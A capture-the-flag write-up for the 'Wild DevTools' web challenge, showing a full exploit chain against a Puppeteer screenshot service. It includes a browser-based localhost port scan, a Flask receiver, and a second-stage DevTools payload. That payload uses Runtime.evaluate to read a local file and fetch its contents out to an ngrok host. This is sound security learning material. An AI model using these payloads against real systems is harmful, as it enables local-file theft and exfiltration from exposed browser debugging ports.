---
description: Browser-based Port Scan + Puppeteer Remote Debugging
---

# Wild DevTools

## Challenge

{% hint style="info" %}
Web, 10 Solves
{% endhint %}

> One of our hackers stole the source code for a top-secret screenshot service. However, he wasn't able to get the flag.
>
> He kept saying it was impossible. That made me think of you, think you can do it?

{% file src="../../.gitbook/assets/wild-devtools-source.zip" %}

## Solution

The goal was to read the flag file, which is written to disk when the server starts up.

```javascript
async function main() {
    const port = 8080;
    const server = express();

    // write flag to disk
    fs.writeFileSync('/tmp/flag.txt', process.env.FLAG);
    
    ...
```

This was essentially a "screenshotter" service that allows us to enter arbitrary URLs to be rendered by a Chromium instance.

The `validateScreenshotRequest` middleware makes sure that we specify a HTTP(S) URL, so the `file://` protocol will not work here.

```javascript
function validateScreenshotRequest(req, res, next) {
    if (!req.query.url || typeof req.query.url !== 'string') {
        return res.status(400).json({ error: 'url is required' });
    }

    try {
        let url = new URL(req.query.url);
        if (url.protocol !== 'http:' && url.protocol !== 'https:') {
            return res.status(400).json({ error: 'invalid protocol' });
        }
    } catch {
        return res.status(400).json({ error: 'invalid URL' });
    }

    next();
}
```

Of particular interest, however, is the way that the browser instance is launched.

```javascript
async function getBrowserWithTimeout(seconds) {
    log('launching browser...');
    let browser = null;

    for (let i = 0; i < 5; i++) {
        if (browser !== null) {
            continue;
        }
        try {
            browser = await puppeteer.launch({
                timeout: 5000,
                headless: true,
                dumpio: true,
                ignoreDefaultArgs: [
                    '--disable-popup-blocking'
                ],
                args: [
                    '--no-sandbox',
                    '--ignore-certificate-errors',
                    '--disable-setuid-sandbox',
                    '--disable-accelerated-2d-canvas',
                    '--disable-gpu',
                    '--proxy-server=smokescreen:4750',
                    `--remote-debugging-port=${getRandomPort()}`
                ]
            });
        } catch (err) {
            browser = null;
            log(err);
        }
    }
    
    ...
```

A remote debugging port is exposed. This normally allows us to send commands to the browser through the [DevTools protocol](https://chromedevtools.github.io/devtools-protocol/). In this case, however, we can see that the debugging port is randomised.

```javascript
export default function () {
    let port = 9000 + Math.floor(Math.random() * 2000);
    return port;
}
```

### Leaking the Debugging Port

We had a range of 2000 possible ports to scan, but the browser will only live for 30 seconds before it was closed.

```javascript
setTimeout(async () => {
    try {
        await browser.close();
    } catch (err) {
        log('browser.close() failed:', err.message);
    }
}, seconds * 1000);
```

If we could leak the debugging port, then we could communicate with the Chromium instance to open a new page with the `file:///tmp/flag` URL, and read its contents.&#x20;

There are many ways to do this, but my first reaction was to do it through a common XS-Leaks technique. The idea is that if the port is closed, trying to load it as a resource would yield a Connection Refused error, triggering the `onerror` event handler. Otherwise, the `onload` event handler would be fired instead on successful loading.

```markup
<html>
    <body>
        <script>
            (async () => {
                const leak = async (url) => {
                    return new Promise((r) => {
                        let s = document.createElement('script')
                        s.src = url
                        s.onload = (e) => {
                            e.target.remove()
                            return r(0)
                        }
                        s.onerror = (e) => {
                            e.target.remove()
                            return r(1)
                        }
                        document.head.appendChild(s)
                    })
                }
                
                for (let i = 0; i < 2000; i++) {
                    let port = 9000 + i;
                    let res = await leak(`http://localhost:${port}/`)
                    
                    if (res == 0) {
                        console.log(`Port ${port} is open`)
                        try {
                            fetch(`http://986d-42-60-68-174.ngrok.io/leak?port=${port}`)
                        }
                        catch {}
                        break
                    }
                }
            })();
        </script>
    </body>
</html>
```

This was sufficient to leak the debugging port within 5-10 seconds. Once we get the port number, we need to modify our second-stage payload with the updated port number, so I wrote the port number to a `port.txt` file to be read by another script later on.

```python
from flask import Flask, request, send_file

app = Flask(__name__)


@app.route('/<path:path>')
def send(path):
    return send_file(path)


@app.route('/exfil', methods=['POST'])
def receive():
    print(request.data)
    return request.data


@app.route('/leak')
def leak():
    port = request.args.get('port')
    open("port.txt", "w").write(port)
    return "OK"


if __name__ == '__main__':
    app.run('0.0.0.0', 5000)
```

### Reading the Response

Now that we know the port, we could fetch `http://127.0.0.1:<PORT>/json/new?file:///tmp/flag.txt` to tell the browser to open a new page with the `file:///tmp/flag.txt` URL.

The response would then contain a `webSocketDebuggerUrl` that allows us to send commands to the browser through a WebSocket connection.

Unfortunately, due to the same-origin policy, we can't directly read the response through the Fetch API. But by loading an `iframe`, the response is shown in the screenshotter service as an image. We can add the following to our script above, to load the `iframe` and open a second-stage exploit after 10 seconds to communicate with the WebSocket URL.

```javascript
...

let ifr = document.createElement('iframe')
ifr.src = `http://localhost:${port}/json/new?file:///tmp/flag.txt`

ifr.height = 1000
ifr.width = 1000
document.body.appendChild(ifr)

setTimeout(() => {
    window.open("http://986d-42-60-68-174.ngrok.io/exploit.html")
}, 10000)

...
```

The result of the screenshotter service would look something like this. We need to interpret the result and modify our second-stage exploit before the 10 seconds is up and the browser opens it.

![](<../../.gitbook/assets/image (81).png>)

I used [PyTesseract](https://pypi.org/project/pytesseract/) to perform OCR on the result and extract the WebSocket URL. Due to the quality of the image, this was only fully accurate about 1 in 5 times. The script will also update our second-stage payload with the correct port and WebSocket URL.

```python
import requests
import pytesseract
from PIL import Image
from io import BytesIO
import re
import time
import os

while True:

    r = requests.get("https://wild-devtools.ctf.bsidestlv.com/screenshot")

    puzzle = r.headers['X-Puzzle']

    print(f"Puzzle: {puzzle}")

    # get pow by running pow.go
    pow = os.popen("go run pow/pow.go {}".format(puzzle)).read().strip()
    print(f"POW: {pow}")

    r = requests.get(
        "http://wild-devtools.ctf.bsidestlv.com/screenshot?url=http://986d-42-60-68-174.ngrok.io/leak.html",
        headers={
            'X-Puzzle': puzzle,
            'X-Proof-of-Work': pow
        }
    )
    img = r.content

    # OCR
    with open("screenshot.png", "wb") as f:
        f.write(img)
        
    text = pytesseract.image_to_string(Image.open(BytesIO(img)))
    print(text.splitlines()[5])

    wsUrl = re.search(r"/devtools/page/(.*)\"", text.splitlines()[5]).group(1).replace(" ", "").replace("S", "5").replace("O", "0").replace("I", "1").replace("L", "1").replace("T", "7")
    print(wsUrl)

    expl = open("exploit.tpl", "r").read().replace("PORTHERE", open("port.txt", "r").read()).replace("URLHERE", wsUrl)
    with open("exploit.html", "w") as f:
        f.write(expl)
```

### Getting the Flag

After we have done all that, the second-stage payload is opened. The `Runtime.evaluate` method is used to execute JavaScript on the `file:///tmp/flag.txt` page, and exfiltrate its contents.

```markup
<body>
    <script>
        window.ws = new WebSocket('ws://127.0.0.1:PORTHERE/devtools/page/URLHERE')
        ws.onerror = (e => { console.log(e) })
        ws.onmessage = (e => {
            console.log(e.data);
        })

        ws.onopen = () => {
            ws.send(JSON.stringify({
                id: 1,
                method: "Runtime.evaluate",
                params: {
                    expression: "fetch('http://986d-42-60-68-174.ngrok.io/exfil', {method:'POST', body:document.body.innerHTML})"
                }
            }))

        }
    </script>
</body>
```
